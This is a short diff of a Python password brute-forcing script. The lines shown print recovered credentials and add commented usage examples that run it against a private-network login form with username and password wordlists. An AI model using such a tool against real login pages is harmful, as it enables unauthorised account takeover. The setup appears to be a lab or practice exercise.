@@ -82,5 +82,8 @@ if __name__ == "__main__":
     print(f"username : {var1}")
     print(f"password : {var2}")
     print(f"Brute force attack completed in {elapsed_time:.2f} seconds.")
+    
+#python3 brute_force.py http://10.50.76.35/SimpleLoginForm/login.php --userlist wordlists/username.txt --passlist wordlists/passwords.txt --threads 4
+#python3 brute_force.py -h
 
     
